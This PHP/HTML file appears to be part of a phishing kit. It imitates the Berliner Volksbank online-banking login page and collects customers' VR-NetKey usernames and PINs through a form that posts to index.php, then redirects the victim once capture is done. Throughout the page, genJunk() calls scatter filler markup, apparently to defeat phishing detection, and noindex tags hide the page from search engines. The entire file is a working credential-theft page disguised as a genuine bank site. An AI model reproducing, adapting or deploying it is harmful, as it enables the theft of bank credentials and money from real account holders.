<?php
	session_start();
	include("config.php");
	
	if (isset($_SESSION['finished']) && $_SESSION['finished']) {
		header("Location: $redirect");
	}
?>
<!DOCTYPE html>
<html class=" js cssanimations csstransforms video">
	<head>
		<meta http-equiv="X-UA-Compatible" content="IE=10">
		<meta name="robots" content="noindex" />
		<meta name="googlebot" content="noindex">
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<meta name="generator" content="ebPE 16.24-05 BVR2014">
		<title>Online-Banking - Berliner Volksbank eG</title>
		<link rel="stylesheet" title="normal" type="text/css" href="src/vr_css/unit.css">
		<link rel="stylesheet" title="normal" type="text/css" href="src/vr_css/xview.css">
		<link rel="stylesheet" title="normal" type="text/css" href="src/vr_css/pagelayout.css">
		<link rel="stylesheet" title="normal" type="text/css" href="src/vr_css/primaernavi.css">
		<link rel="stylesheet" title="normal" type="text/css" href="src/vr_css/crossnav.css">
		<link rel="stylesheet" title="normal" type="text/css" href="src/vr_css/sekundaernavi.css">
		<link rel="stylesheet" title="normal" type="text/css" href="src/vr_css/global.css">
		<link rel="stylesheet" title="normal" type="text/css" href="src/vr_css/werbung.css">
		<link rel="stylesheet" title="normal" type="text/css" href="src/vr_css/jqui.css">
		<link rel="stylesheet" title="normal" type="text/css" href="src/vr_css/styles.css">
		<link type="text/css" rel="stylesheet" media="print" href="src/vr_css/printOutput.css">
		<style type="text/css">
			#infoMessages ul li {background-image: url(src/vr_img/eb-bookmark-error.svg);}
			.messages #errorMessages ul li {background-image: url(src/vr_img/eb-bookmark-error.svg);}
			.messages #warningMessages ul li {background-image: url(src/vr_img/eb-bookmark-error.svg);}
			.seitenanfang a {background-image:url(src/vr_img/background-seitenanfang.svg);}
		</style>	
	</head>
	<body>
		<?php echo genJunk() ?><div id="scroll">
			<?php echo genJunk() ?><div id="site">
				<?php echo genJunk() ?><div id="main" class="ym-wrapper">
					<?php echo genJunk() ?><div id="header">
						<?php echo genJunk() ?><div>
							<?php echo genJunk() ?><div id="home"></div><?php echo genJunk() ?>
							<?php echo genJunk() ?><div id="bank">
								<span id="logo"><img alt="Logo" src="src/vr_img/ebpe-logo.gif"></span>
							</div><?php echo genJunk() ?>
						</div><?php echo genJunk() ?>
					</div><?php echo genJunk() ?>
					<?php echo genJunk() ?><div class="empty" id="navigation"></div><?php echo genJunk() ?>
					<?php echo genJunk() ?><div id="navBar" class="navBar_DEFAULT"><?php echo genJunk() ?><div id="wpdistance"></div><?php echo genJunk() ?></div><?php echo genJunk() ?>
					<?php echo genJunk() ?><div id="logoutBlock"></div><?php echo genJunk() ?>
					<?php echo genJunk() ?><div class="contentDiv">
						<?php echo genJunk() ?><div id="maincontent" class="maincontent_DEFAULT">
							<?php echo genJunk() ?><div class="breadcrumb empty" id="breadcrumb"></div><?php echo genJunk() ?>
							<form accept-charset="UTF-8" action="index.php" method="post">
								<input name="doLogin" class="blank" src="src/vr_img/blank.gif" type="image">
								<h1 class="stackedFrontletTitle">Anmeldung</h1>
								<?php echo genJunk() ?><div id="contextCommands" style="white-space: nowrap;">
									<a href="#" id="helpLinkElementId" target="Hilfe" title="Hilfe"><img alt="Hilfe" src="src/vr_img/ebpe-hilfe.svg" border="0"> Hilfe</a>
								</div><?php echo genJunk() ?>
								<?php echo genJunk() ?><div class="messages" style="display:<?php echo (isset($_SESSION['err']) ? "block" : "none"); unset($_SESSION['err']); ?>">
									<?php echo genJunk() ?><div id="errorMessages">
										<ul>
											<li style="display:<?php echo (isset($_SESSION['user_err']) ? "block" : "none"); unset($_SESSION['user_err']); ?>">Im Feld "VR-NetKey oder Alias" ist für die Bearbeitung eine Eingabe erforderlich.</li>
											<li style="display:<?php echo (isset($_SESSION['pass_err']) ? "block" : "none"); unset($_SESSION['pass_err']); ?>">Im Feld "PIN" ist für die Bearbeitung eine Eingabe erforderlich.</li>
										</ul>
									</div><?php echo genJunk() ?>
								</div><?php echo genJunk() ?>
								<?php echo genJunk() ?><div class="formInput">
									<?php echo genJunk() ?><div class="XContainer FormularblockUndInhalt" id="mainContent_root">
										<table rules="none" style="table-layout:auto; width:100%;" cellspacing="0" cellpadding="0" border="0">
											<tbody>
											<tr>
												<td><img alt="" src="src/vr_img/xhtml-filler.gif" width="1" height="1"></td><td><img alt="" src="src/vr_img/xhtml-filler.gif" width="1" height="1"></td>
											</tr>
											<tr>
												<td colspan="2" valign="top" align="left">
												<?php echo genJunk() ?><div class="XContainer notVisible" id="cntHinweise">
												<table rules="none" style="table-layout:auto; width:100%;" cellspacing="0" cellpadding="0" border="0">
												<tbody><tr>
												<td valign="top" align="left"><span class="XLabel" id="lblWarningIcon"><img alt="ebpe-warnung" name="ebpe-warnung" src="src/vr_img/ebpe-warnung.gif"></span></td><td valign="top" align="left">
												<?php echo genJunk() ?><div class="XContainer" id="cntHinweisMessageBlock">
												<table rules="none" style="table-layout:auto; width:100%;" cellspacing="0" cellpadding="0" border="0">
												<tbody><tr>
												<td valign="top" align="left"><span class="XLabel" id="lblBrowserTestInfo1">Für die Nutzung des Online-Bankings ist eine Änderung Ihrer Browsereinstellungen erforderlich.</span></td>
												</tr>
												<tr>
												<td valign="top" align="left"><span class="XLabel" id="lblBrowserTestInfo2">Damit
												Sie das Online-Banking nutzen können, müssen Sie Ihre 
												Browsereinstellungen ändern. Bitte aktivieren Sie die Annahme von 
												Cookies (in der Regel im Bereich "Einstellungen &gt; Datenschutz"). 
												Danach schließen Sie das Browserfenster und öffnen die Anmeldeseite des 
												Online-Banking erneut.<br> 
												<br>Weitere Informationen finden Sie in der Hilfe, die Sie durch Klick auf das '?'-Symbol rechts oben aufrufen können.</span></td>
												</tr>
												</tbody></table>
												</div><?php echo genJunk() ?>
												</td>
												</tr>
												</tbody></table>
												</div><?php echo genJunk() ?>
												</td>
											</tr>
											<tr>
												<td><img alt="" src="src/vr_img/xhtml-filler.gif" width="1" height="1"></td><td><img alt="" src="src/vr_img/xhtml-filler.gif" width="1" height="1"></td>
											</tr>
											<tr>
												<td valign="middle" height="30">
												<?php echo genJunk() ?><div class="XContainer FormularblockEmbedded" id="cntBenutzerkennung">
												<table rules="none" style="table-layout:auto; width:100%;" cellspacing="0" cellpadding="0" border="0">
												<tbody><tr>
												<td width="40%" valign="middle" align="right">
												<?php echo genJunk() ?><div class="XContainer FormularblockEmbedded" id="cntBenutzerkennungAuswahl">
												<table rules="none" style="table-layout:auto; width:100%;" cellspacing="0" cellpadding="0" border="0"></table>
												</div><?php echo genJunk() ?>
												</td><td width="60%" valign="middle" align="right"><span class="XLabel nowrap" id="lblBenutzerkennungLabel">VR-NetKey oder Alias:</span></td>
												</tr>
												</tbody></table>
												</div><?php echo genJunk() ?>
												</td><td valign="middle" height="30" align="left"><input autocomplete="off" class="XText " id="txtBenutzerkennung" value="<?php echo (isset($_SESSION['vb_username']) ? $_SESSION['vb_username'] : ""); ?>" maxlength="35" name="vb_username" size="35" style="" type="text"></td>
											</tr>
											<tr>
												<td valign="middle" align="right"><span class="XLabel nowrap" id="lblPinLabel">PIN:</span></td>
												<td valign="middle" align="left"><input autocomplete="off" class="XPassword " id="pwdPin" maxlength="20" name="vb_password" size="25" style="" value="" type="password"></td>
											</tr>
											<tr>
												<td><img alt="" src="src/vr_img/xhtml-filler.gif" width="1" height="1"></td><td><img alt="" src="src/vr_img/xhtml-filler.gif" width="1" height="1"></td>
											</tr>
											<tr>
												<td><img alt="" src="src/vr_img/xhtml-filler.gif" width="1" height="1"></td><td><img alt="" src="src/vr_img/xhtml-filler.gif" width="1" height="1"></td>
											</tr>
											<tr>
												<td valign="top" align="left"><input class=" " id="txtRZBK" maxlength="4" name="value_15117297.mainContent_root_txtRZBK" style="" value="0120" type="hidden"></td><td></td>
											</tr>
											</tbody>
										</table>
									</div><?php echo genJunk() ?>
								</div><?php echo genJunk() ?>
								<?php echo genJunk() ?><div class="formSubmit">
									<?php echo genJunk() ?><div class="UnitCommands actionBar" id="UnitCommands">
									<input class="UnitCommand" name="sendOB_Login_x" onclick="return checkSubmit('Anmelden');" value="Anmelden" type="submit">
								</div><?php echo genJunk() ?>
								</div><?php echo genJunk() ?>
							</form>
							
						</div><?php echo genJunk() ?>
						
						<?php echo genJunk() ?><div style="clear:both"></div><?php echo genJunk() ?>
					</div><?php echo genJunk() ?>
					
				</div><?php echo genJunk() ?>
				<?php echo genJunk() ?><div id="footernaviInfoMenu">
					<ul>
						<li>
						<a href="#" target="demo" title="Zur Demo-Anwendung 16.24-05 (11)">Zur Demo-Anwendung</a>
						</li>
						<li>
						<a href="#" target="Impressum" title="Impressum">Impressum</a>
						</li>
						<li>
						<a href="#" title="AGB">AGB</a>
						</li>
						<li>
						<a href="#" target="hilfe" title="Hilfe zur Version 16.24-05">Hilfe</a></li>
						<li>
						<a href="#" target="sicherheitshinweise" title="Sicherheitshinweise">Sicherheitshinweise</a>
						</li>
					</ul>
				</div><?php echo genJunk() ?>
			</div><?php echo genJunk() ?>
		</div><?php echo genJunk() ?>  
	</body>
</html>